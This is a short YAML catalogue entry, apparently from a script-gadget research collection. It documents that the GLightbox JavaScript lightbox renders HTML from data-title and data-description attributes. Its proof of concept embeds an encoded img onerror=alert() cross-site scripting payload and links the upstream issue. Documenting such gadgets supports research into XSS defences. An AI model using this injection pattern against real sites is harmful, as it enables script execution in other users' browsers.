---
description: GLightbox is a pure javascript lightbox. It can display images, iframes, inline content and videos with optional autoplay for YouTube, Vimeo and even self hosted videos.
github: biati-digital/glightbox
gadgets:
  Latest:
    authors:
      - github:LukeLambert
    tags:
      - any-tag
      - data-attr
      - any-timing
      - chrome-browser
      - firefox-browser
      - safari-browser
    pocs:
      - description: glightbox uses HTML from the `data-title` and `data-description` attributes.
        code: |
          <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
          <script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>
          <a href="https://example.com/" class="glightbox" data-title="&lt;img src=x onerror=&quot;alert()&quot;&gt;">Click me</a>
          <a href="https://example.com/" class="glightbox" data-description="&lt;img src=x onerror=&quot;alert()&quot;&gt;">Click me</a>
          <script>GLightbox();</script>
    links:
      - https://github.com/biati-digital/glightbox/issues/455
---
